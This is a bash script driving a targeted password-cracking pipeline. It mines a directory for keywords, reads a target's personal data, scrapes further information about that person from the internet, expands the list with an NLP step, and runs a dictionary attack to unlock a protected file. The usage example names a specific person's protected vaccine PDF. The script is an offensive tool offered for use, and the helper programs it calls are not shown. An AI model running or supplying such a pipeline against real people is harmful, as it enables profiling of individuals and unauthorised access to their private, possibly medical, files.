#!/bin/bash
# usage -  bash osint_dictionary_attack.sh {local search directory} {personal data json file} {protected file to unlock}
# example - bash osint_dictionary_attack.sh ~/Music/test_loc personal_data.json nishal_vaccine_protected.pdf

echo -e "Performing Search on directory $1"
gcc local_search.c -o local_search
./local_search -d $1 -e txt -o search_keywords.txt
awk '!seen[$0]++' search_keywords.txt > tmp && mv tmp search_keywords.txt 
awk 'NF' search_keywords.txt > tmp && mv tmp search_keywords.txt

echo -e "#####                     (33%)"

echo -e "Getting personal information from $2"
python personal_input.py $2
awk '!seen[$0]++' target_info.txt > tmp && mv tmp target_info.txt 
awk 'NF' target_info.txt > tmp && mv tmp target_info.txt

echo -e '###########               (55%)'

echo -e 'Running OSINT tool to scrap information from the internet'
python osint_scraper_api.py target_info.txt 
awk '!seen[$0]++' target_info_with_osint.txt > tmp && mv tmp target_info_with_osint.txt 
awk 'NF' target_info_with_osint.txt > tmp && mv tmp target_info_with_osint.txt
sed -E '/^.{1,3}$/d' target_info_with_osint.txt > tmp && mv tmp target_info_with_osint.txt

echo -e '##############            (66%)'

echo -e 'Running NLP tool to find semantically similar keywords'
sort -n search_keywords.txt target_info_with_osint.txt > combined_keywords.txt
python nlp_similar_words.py combined_keywords.txt
awk '!seen[$0]++' final_keywords.txt > tmp && mv tmp final_keywords.txt 
awk 'NF' final_keywords.txt > tmp && mv tmp final_keywords.txt
echo -e 'Final Dictionary used for attack can be found in final_keywords.txt'

echo -e '#################            (77%)'

echo -e "Trying to unlock file $3 using dictionary"
python unlock_pdf.py -l final_keywords.txt -f $3

echo -e '#######################   (100%)'
echo -e ''
